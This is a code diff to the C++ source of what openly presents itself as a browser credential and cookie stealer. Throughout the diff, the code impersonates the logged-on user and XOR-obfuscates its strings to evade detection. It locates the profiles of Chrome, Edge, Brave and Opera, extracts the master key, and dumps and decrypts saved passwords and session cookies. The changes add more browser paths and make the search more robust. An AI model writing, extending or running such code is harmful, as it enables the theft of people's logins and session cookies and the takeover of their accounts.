@@ -23,13 +23,21 @@ namespace credential {
 
     namespace {
         // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
-        const wchar_t kOsCryptEnc[] = { 'o'^0x4B, 's'^0x1F, '_'^0x8C, 'c'^0x3E, 'r'^0x4B, 'y'^0x1F, 'p'^0x8C, 't'^0x3E }; // os_crypt
-        const wchar_t kEncryptedKeyEnc[] = { 'e'^0x4B, 'n'^0x1F, 'c'^0x8C, 'r'^0x3E, 'y'^0x4B, 'p'^0x1F, 't'^0x8C, 'e'^0x3E, 'd'^0x4B, '_'^0x1F, 'k'^0x8C, 'e'^0x3E, 'y'^0x4B }; // encrypted_key
-        const wchar_t kLocalStateEnc[] = { 'L'^0x4B, 'o'^0x1F, 'c'^0x8C, 'a'^0x3E, 'l'^0x4B, ' '^0x1F, 'S'^0x8C, 't'^0x3E, 'a'^0x4B, 't'^0x1F, 'e'^0x8C }; // Local State
-        const wchar_t kLoginDataEnc[] = { 'L'^0x4B, 'o'^0x1F, 'g'^0x8C, 'i'^0x3E, 'n'^0x4B, ' '^0x1F, 'D'^0x8C, 'a'^0x3E, 't'^0x4B, 'a'^0x1F }; // Login Data
-        const wchar_t kCookiesEnc[] = { 'C'^0x4B, 'o'^0x1F, 'o'^0x8C, 'k'^0x3E, 'i'^0x4B, 'e'^0x1F, 's'^0x8C }; // Cookies
-        const wchar_t kQueryLoginsEnc[] = { 'S'^0x4B, 'E'^0x1F, 'L'^0x8C, 'E'^0x3E, 'C'^0x4B, 'T'^0x1F, ' '^0x8C, 'o'^0x3E, 'r'^0x4B, 'i'^0x1F, 'g'^0x8C, 'i'^0x3E, 'n'^0x4B, '_'^0x1F, 'u'^0x8C, 'r'^0x3E, 'l'^0x4B, ','^0x1F, ' '^0x8C, 'u'^0x3E, 's'^0x4B, 'e'^0x1F, 'r'^0x8C, 'n'^0x3E, 'a'^0x4B, 'm'^0x1F, 'e'^0x8C, '_'^0x3E, 'v'^0x4B, 'a'^0x1F, 'l'^0x8C, 'u'^0x3E, 'e'^0x4B, ','^0x1F, ' '^0x8C, 'p'^0x3E, 'a'^0x4B, 's'^0x1F, 's'^0x8C, 'w'^0x3E, 'o'^0x4B, 'r'^0x1F, 'd'^0x8C, '_'^0x3E, 'v'^0x4B, 'a'^0x1F, 'l'^0x8C, 'u'^0x3E, 'e'^0x4B, ' '^0x1F, 'F'^0x8C, 'R'^0x3E, 'O'^0x4B, 'M'^0x1F, ' '^0x8C, 'l'^0x3E, 'o'^0x4B, 'g'^0x1F, 'i'^0x8C, 'n'^0x3E, 's'^0x4B }; // SELECT origin_url, username_value, password_value FROM logins
-        const wchar_t kQueryCookiesEnc[] = { 'S'^0x4B, 'E'^0x1F, 'L'^0x8C, 'E'^0x3E, 'C'^0x4B, 'T'^0x1F, ' '^0x8C, 'h'^0x3E, 'o'^0x4B, 's'^0x1F, 't'^0x8C, '_'^0x3E, 'k'^0x4B, 'e'^0x1F, 'y'^0x8C, ','^0x3E, ' '^0x4B, 'p'^0x1F, 'a'^0x8C, 't'^0x3E, 'h'^0x4B, ','^0x1F, ' '^0x8C, 'i'^0x3E, 's'^0x4B, '_'^0x1F, 's'^0x8C, 'e'^0x3E, 'c'^0x4B, 'u'^0x1F, 'r'^0x8C, 'e'^0x3E, ','^0x1F, ' '^0x8C, 'e'^0x3E, 'x'^0x4B, 'p'^0x1F, 'i'^0x8C, 'r'^0x3E, 'e'^0x4B, 's'^0x1F, '_'^0x8C, 'u'^0x3E, 't'^0x4B, 'c'^0x1F, ','^0x1F, ' '^0x8C, 'n'^0x3E, 'a'^0x4B, 'm'^0x1F, 'e'^0x8C, ','^0x3E, ' '^0x4B, 'e'^0x1F, 'n'^0x8C, 'c'^0x3E, 'r'^0x4B, 'y'^0x1F, 'p'^0x8C, 't'^0x3E, 'e'^0x4B, 'd'^0x1F, '_'^0x8C, 'v'^0x3E, 'a'^0x4B, 'l'^0x1F, 'u'^0x8C, 'e'^0x3E, ' '^0x4B, 'F'^0x1F, 'R'^0x8C, 'O'^0x3E, 'M'^0x4B, ' '^0x1F, 'c'^0x8C, 'o'^0x3E, 'o'^0x4B, 'k'^0x1F, 'i'^0x8C, 'e'^0x3E, 's'^0x4B }; // SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies
+        const wchar_t kOsCryptEnc[] = { L'o'^0x4B, L's'^0x1F, L'_'^0x8C, L'c'^0x3E, L'r'^0x4B, L'y'^0x1F, L'p'^0x8C, L't'^0x3E }; // os_crypt
+        const wchar_t kEncryptedKeyEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'_'^0x1F, L'k'^0x8C, L'e'^0x3E, L'y'^0x4B }; // encrypted_key
+        const wchar_t kLocalStateEnc[] = { L'L'^0x4B, L'o'^0x1F, L'c'^0x8C, L'a'^0x3E, L'l'^0x4B, L' '^0x1F, L'S'^0x8C, L't'^0x3E, L'a'^0x4B, L't'^0x1F, L'e'^0x8C }; // Local State
+        const wchar_t kLoginDataEnc[] = { L'L'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L' '^0x1F, L'D'^0x8C, L'a'^0x3E, L't'^0x4B, L'a'^0x1F }; // Login Data
+        const wchar_t kCookiesEnc[] = { L'C'^0x4B, L'o'^0x1F, L'o'^0x8C, L'k'^0x3E, L'i'^0x4B, L'e'^0x1F, L's'^0x8C }; // Cookies
+        const wchar_t kQueryLoginsEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'o'^0x3E, L'r'^0x4B, L'i'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L'_'^0x1F, L'u'^0x8C, L'r'^0x3E, L'l'^0x4B, L','^0x1F, L' '^0x8C, L'u'^0x3E, L's'^0x4B, L'e'^0x1F, L'r'^0x8C, L'n'^0x3E, L'a'^0x4B, L'm'^0x1F, L'e'^0x8C, L'_'^0x3E, L'v'^0x4B, L'a'^0x1F, L'l'^0x8C, L'u'^0x3E, L'e'^0x4B, L','^0x1F, L' '^0x8C, L'p'^0x3E, L'a'^0x4B, L's'^0x1F, L's'^0x8C, L'w'^0x3E, L'o'^0x4B, L'r'^0x1F, L'd'^0x8C, L'_'^0x3E, L'v'^0x4B, L'a'^0x1F, L'l'^0x8C, L'u'^0x3E, L'e'^0x4B, L' '^0x1F, L'F'^0x8C, L'R'^0x3E, L'O'^0x4B, L'M'^0x1F, L' '^0x8C, L'l'^0x3E, L'o'^0x4B, L'g'^0x1F, L'i'^0x8C, L'n'^0x3E, L's'^0x4B }; // SELECT origin_url, username_value, password_value FROM logins
+        const wchar_t kQueryCookiesEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'h'^0x3E, L'o'^0x4B, L's'^0x1F, L't'^0x8C, L'_'^0x3E, L'k'^0x4B, L'e'^0x1F, L'y'^0x8C, L','^0x3E, L' '^0x4B, L'p'^0x1F, L'a'^0x8C, L't'^0x3E, L'h'^0x4B, L','^0x1F, L' '^0x8C, L'i'^0x3E, L's'^0x4B, L'_'^0x1F, L's'^0x8C, L'e'^0x3E, L'c'^0x4B, L'u'^0x1F, L'r'^0x8C, L'e'^0x3E, L','^0x1F, L' '^0x8C, L'e'^0x3E, L'x'^0x4B, L'p'^0x1F, L'i'^0x8C, L'r'^0x3E, L'e'^0x4B, L's'^0x1F, L'_'^0x8C, L'u'^0x3E, L't'^0x4B, L'c'^0x1F, L','^0x1F, L' '^0x8C, L'n'^0x3E, L'a'^0x4B, L'm'^0x1F, L'e'^0x8C, L','^0x3E, L' '^0x4B, L'e'^0x1F, L'n'^0x8C, L'c'^0x3E, L'r'^0x4B, L'y'^0x1F, L'p'^0x8C, L't'^0x3E, L'e'^0x4B, L'd'^0x1F, L'_'^0x8C, L'v'^0x3E, L'a'^0x4B, L'l'^0x1F, L'u'^0x8C, L'e'^0x3E, L' '^0x4B, L'F'^0x1F, L'R'^0x8C, L'O'^0x3E, L'M'^0x4B, L' '^0x1F, L'c'^0x8C, L'o'^0x3E, L'o'^0x4B, L'k'^0x1F, L'i'^0x8C, L'e'^0x3E, L's'^0x4B }; // SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies
+
+        // Browser paths
+        const wchar_t kChromePathEnc[] = { L'\\'^0x4B, L'G'^0x1F, L'o'^0x8C, L'o'^0x3E, L'g'^0x4B, L'l'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'C'^0x4B, L'h'^0x1F, L'r'^0x8C, L'o'^0x3E, L'm'^0x4B, L'e'^0x1F, L'\\'^0x8C, L'U'^0x3E, L's'^0x4B, L'e'^0x1F, L'r'^0x8C, L' '^0x3E, L'D'^0x4B, L'a'^0x1F, L't'^0x8C, L'a'^0x3E };
+        const wchar_t kChromeBetaPathEnc[] = { L'\\'^0x4B, L'G'^0x1F, L'o'^0x8C, L'o'^0x3E, L'g'^0x4B, L'l'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'C'^0x4B, L'h'^0x1F, L'r'^0x8C, L'o'^0x3E, L'm'^0x4B, L'e'^0x1F, L' '^0x8C, L'B'^0x3E, L'e'^0x4B, L't'^0x1F, L'a'^0x8C, L'\\'^0x3E, L'U'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L' '^0x4B, L'D'^0x1F, L'a'^0x8C, L't'^0x3E, L'a'^0x4B };
+        const wchar_t kEdgePathEnc[] = { L'\\'^0x4B, L'M'^0x1F, L'i'^0x8C, L'c'^0x3E, L'r'^0x4B, L'o'^0x1F, L's'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'\\'^0x8C, L'E'^0x3E, L'd'^0x4B, L'g'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'U'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L' '^0x4B, L'D'^0x1F, L'a'^0x8C, L't'^0x3E, L'a'^0x4B };
+        const wchar_t kBravePathEnc[] = { L'\\'^0x4B, L'B'^0x1F, L'r'^0x8C, L'a'^0x3E, L'v'^0x4B, L'e'^0x1F, L'S'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'w'^0x8C, L'a'^0x3E, L'r'^0x4B, L'e'^0x1F, L'\\'^0x8C, L'B'^0x3E, L'r'^0x4B, L'a'^0x1F, L'v'^0x8C, L'e'^0x3E, L'-'^0x4B, L'B'^0x1F, L'r'^0x8C, L'o'^0x3E, L'w'^0x4B, L's'^0x1F, L'e'^0x8C, L'r'^0x3E, L'\\'^0x4B, L'U'^0x1F, L's'^0x8C, L'e'^0x3E, L'r'^0x4B, L' '^0x1F, L'D'^0x8C, L'a'^0x3E, L't'^0x4B, L'a'^0x1F };
+        const wchar_t kOperaPathEnc[] = { L'\\'^0x4B, L'O'^0x1F, L'p'^0x8C, L'e'^0x3E, L'r'^0x4B, L'a'^0x1F, L' '^0x8C, L'S'^0x3E, L'o'^0x4B, L'f'^0x1F, L't'^0x8C, L'w'^0x3E, L'a'^0x4B, L'r'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'O'^0x4B, L'p'^0x1F, L'e'^0x8C, L'r'^0x3E, L'a'^0x4B, L' '^0x1F, L'S'^0x8C, L't'^0x3E, L'a'^0x4B, L'b'^0x1F, L'l'^0x8C, L'e'^0x3E };
+        const wchar_t kOperaGxPathEnc[] = { L'\\'^0x4B, L'O'^0x1F, L'p'^0x8C, L'e'^0x3E, L'r'^0x4B, L'a'^0x1F, L' '^0x8C, L'S'^0x3E, L'o'^0x4B, L'f'^0x1F, L't'^0x8C, L'w'^0x3E, L'a'^0x4B, L'r'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'O'^0x4B, L'p'^0x1F, L'e'^0x8C, L'r'^0x3E, L'a'^0x4B, L' '^0x1F, L'G'^0x8C, L'X'^0x3E, L' '^0x4B, L'S'^0x1F, L't'^0x8C, L'a'^0x3E, L'b'^0x4B, L'l'^0x1F, L'e'^0x8C };
 
         std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
             try {
@@ -54,8 +62,8 @@ namespace credential {
                 f >> j;
                 if (tempLocalState != localStatePath) DeleteFileA(tempLocalState.c_str());
 
-                std::string os_crypt = utils::ws2s(utils::DecryptW(kOsCryptEnc, 8));
-                std::string encrypted_key_str = utils::ws2s(utils::DecryptW(kEncryptedKeyEnc, 13));
+                std::string os_crypt = utils::ws2s(utils::DecryptW(kOsCryptEnc, sizeof(kOsCryptEnc)/sizeof(kOsCryptEnc[0])));
+                std::string encrypted_key_str = utils::ws2s(utils::DecryptW(kEncryptedKeyEnc, sizeof(kEncryptedKeyEnc)/sizeof(kEncryptedKeyEnc[0])));
 
                 if (!j.contains(os_crypt) || !j[os_crypt].contains(encrypted_key_str)) {
                     LOG_DEBUG("Local State does not contain expected keys");
@@ -155,7 +163,8 @@ namespace credential {
 
     std::string DumpChromiumPasswords() {
         bool impersonated = utils::ImpersonateLoggedOnUser();
-        std::string report = "BROWSER_CREDENTIALS:\n";
+        std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
+        if (!impersonated) report += "[!] Impersonation failed.\n";
         report += "BROWSER | URL | USERNAME | PASSWORD\n";
         report += "--------------------------------------------------------------------------------\n";
 
@@ -173,29 +182,53 @@ namespace credential {
             
         struct BrowserPath {
             std::string name;
-            std::string userDataPath;
-            bool isRoaming;
+            std::string localPath;
+            std::string roamingPath;
         };
 
         std::vector<BrowserPath> browsers = {
-            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x58\xE3\x59\x27\x73\xED\x62\x08\x77\xFE\x51\x26\x7A\xD0\x6B\x38\x7A\xFE\x1E\x0F\x7E\xF8\x5F\x17", 25)), false}, // \Google\Chrome\User Data
-            {"Edge", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x1D\xE3\x53\x39\x70\xF3\x51\x2D\x74\xA0\x0B\x21\x74\xE1\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A\x17", 25)), false}, // \Microsoft\Edge\User Data
-            {"Brave", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x0D\xF3\x20\x31\x72\x8F\x27\x3E\x29\x2D\x24\x2E\x16\x03\x3D\x22\x39\x2B\x22\x16\x1D\x3E\x2E\x34\x3C\x26\x31\x1D\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A", 38)), false}, // \BraveSoftware\Brave-Browser\User Data
-            {"Opera", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x31", 22)), true}, // \Opera Software\Opera Stable
-            {"Opera GX", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x00\x08\x17\x10\x3E\x3C\x21\x21\x31", 30)), true} // \Opera Software\Opera GX Stable
+            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, sizeof(kChromePathEnc)/sizeof(kChromePathEnc[0]))), ""},
+            {"Chrome Beta", localAppData + utils::ws2s(utils::DecryptW(kChromeBetaPathEnc, sizeof(kChromeBetaPathEnc)/sizeof(kChromeBetaPathEnc[0]))), ""},
+            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, sizeof(kEdgePathEnc)/sizeof(kEdgePathEnc[0]))), ""},
+            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, sizeof(kBravePathEnc)/sizeof(kBravePathEnc[0]))), ""},
+            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0])))},
+            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0])))}
         };
 
         for (const auto& browser : browsers) {
-            if (!fs::exists(browser.userDataPath)) continue;
+            std::string localState;
+            if (fs::exists(browser.localPath)) {
+                localState = browser.localPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
+            }
 
-            std::string localState = browser.userDataPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, 11));
+            if (localState.empty() || !fs::exists(localState)) {
+                 // Try roaming if local didn't work (for some configurations)
+                 if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) {
+                     std::string altState = browser.roamingPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
+                     if (fs::exists(altState)) localState = altState;
+                 }
+            }
+
+            if (localState.empty() || !fs::exists(localState)) {
+                LOG_DEBUG("Local State not found for " + browser.name);
+                continue;
+            }
+
             std::vector<BYTE> key = GetMasterKey(localState);
+            if (key.empty()) report += "[!] No master key for " + browser.name + "\n";
 
-            try {
-                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
+            // Search for Login Data in both local and roaming paths
+            std::vector<std::string> searchPaths;
+            if (!browser.localPath.empty()) searchPaths.push_back(browser.localPath);
+            if (!browser.roamingPath.empty() && browser.roamingPath != browser.localPath) searchPaths.push_back(browser.roamingPath);
+
+            for (const auto& searchPath : searchPaths) {
+                if (!fs::exists(searchPath)) continue;
+                try {
+                for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
                     try {
                         const auto& entry = *it;
-                        if (entry.path().filename().string() == utils::ws2s(utils::DecryptW(kLoginDataEnc, 10))) {
+                        if (entry.path().filename().string() == utils::ws2s(utils::DecryptW(kLoginDataEnc, sizeof(kLoginDataEnc)/sizeof(kLoginDataEnc[0])))) {
                             std::string loginData = entry.path().string();
                             
                             char tempPath[MAX_PATH];
@@ -206,7 +239,7 @@ namespace credential {
 
                             sqlite3* db;
                             if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, 57));
+                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, sizeof(kQueryLoginsEnc)/sizeof(kQueryLoginsEnc[0])));
                                 const char* query = query_str.c_str();
                                 sqlite3_stmt* stmt;
                                 if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
@@ -234,7 +267,7 @@ namespace credential {
                                 sqlite3_close(db);
                             } else {
                                 if (db) {
-                                    LOG_DEBUG("SQLite open failed: " + std::string(sqlite3_errmsg(db)));
+                                    LOG_DEBUG("SQLite open failed for " + browser.name + ": " + std::string(sqlite3_errmsg(db)));
                                     sqlite3_close(db);
                                 }
                             }
@@ -255,6 +288,7 @@ namespace credential {
         bool impersonated = utils::ImpersonateLoggedOnUser();
         std::stringstream resultSS;
         resultSS << "# CHROMIUM COOKIE STEALER RESULTS\n";
+        if (!impersonated) resultSS << "# [!] Impersonation failed.\n";
         int cookieCount = 0;
 
         char path[MAX_PATH];
@@ -271,31 +305,48 @@ namespace credential {
 
         struct BrowserPath {
             std::string name;
-            std::string userDataPath;
-            bool isRoaming;
+            std::string localPath;
+            std::string roamingPath;
         };
 
         std::vector<BrowserPath> browsers = {
-            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x58\xE3\x59\x27\x73\xED\x62\x08\x77\xFE\x51\x26\x7A\xD0\x6B\x38\x7A\xFE\x1E\x0F\x7E\xF8\x5F", 24)), false},
-            {"Edge", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x1D\xE3\x53\x39\x70\xF3\x51\x2D\x74\xA0\x0B\x21\x74\xE1\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A", 23)), false},
-            {"Brave", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x0D\xF3\x20\x31\x72\x8F\x27\x3E\x29\x2D\x24\x2E\x16\x03\x3D\x22\x39\x2B\x22\x16\x1D\x3E\x2E\x34\x3C\x26\x31\x1D\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A", 38)), false},
-            {"Opera", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x31", 22)), true},
-            {"Opera GX", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x00\x08\x17\x10\x3E\x3C\x21\x21\x31", 30)), true}
+            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, sizeof(kChromePathEnc)/sizeof(kChromePathEnc[0]))), ""},
+            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, sizeof(kEdgePathEnc)/sizeof(kEdgePathEnc[0]))), ""},
+            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, sizeof(kBravePathEnc)/sizeof(kBravePathEnc[0]))), ""},
+            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0])))},
+            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0])))}
         };
 
         for (const auto& browser : browsers) {
-            if (!fs::exists(browser.userDataPath)) continue;
+            std::string localState;
+            if (fs::exists(browser.localPath)) {
+                localState = browser.localPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
+            }
 
-            std::string localState = browser.userDataPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, 11));
+            if (localState.empty() || !fs::exists(localState)) {
+                 if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) {
+                     std::string altState = browser.roamingPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
+                     if (fs::exists(altState)) localState = altState;
+                 }
+            }
+
+            if (localState.empty() || !fs::exists(localState)) continue;
+
             std::vector<BYTE> key = GetMasterKey(localState);
 
-            try {
-                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
+            std::vector<std::string> searchPaths;
+            if (!browser.localPath.empty()) searchPaths.push_back(browser.localPath);
+            if (!browser.roamingPath.empty() && browser.roamingPath != browser.localPath) searchPaths.push_back(browser.roamingPath);
+
+            for (const auto& searchPath : searchPaths) {
+                if (!fs::exists(searchPath)) continue;
+                try {
+                for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
                     try {
                         const auto& entry = *it;
                         std::string filename = entry.path().filename().string();
 
-                        if (filename == utils::ws2s(utils::DecryptW(kCookiesEnc, 7))) {
+                        if (filename == utils::ws2s(utils::DecryptW(kCookiesEnc, sizeof(kCookiesEnc)/sizeof(kCookiesEnc[0])))) {
                             std::string cookiesPath = entry.path().string();
 
                             char tempPath[MAX_PATH];
@@ -306,7 +357,7 @@ namespace credential {
 
                             sqlite3* db;
                             if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, 86));
+                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, sizeof(kQueryCookiesEnc)/sizeof(kQueryCookiesEnc[0])));
                                 const char* query = query_str.c_str();
                                 sqlite3_stmt* stmt;
                                 if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
@@ -325,8 +376,6 @@ namespace credential {
                                             std::string value = DecryptPassword(encryptedVal, key);
 
                                             if (!value.empty()) {
-                                                // Chromium expiry is microseconds since 1601. Convert to unix for standard format?
-                                                // Standard Netscape format uses seconds since 1970.
                                                 long long unixExpiry = (expiry / 1000000) - 11644473600LL;
                                                 if (unixExpiry < 0) unixExpiry = 0;
 
@@ -342,8 +391,6 @@ namespace credential {
                                         }
                                     }
                                     sqlite3_finalize(stmt);
-                                } else {
-                                    LOG_ERR("Failed to prepare cookie query for " + browser.name);
                                 }
                                 sqlite3_close(db);
                             }
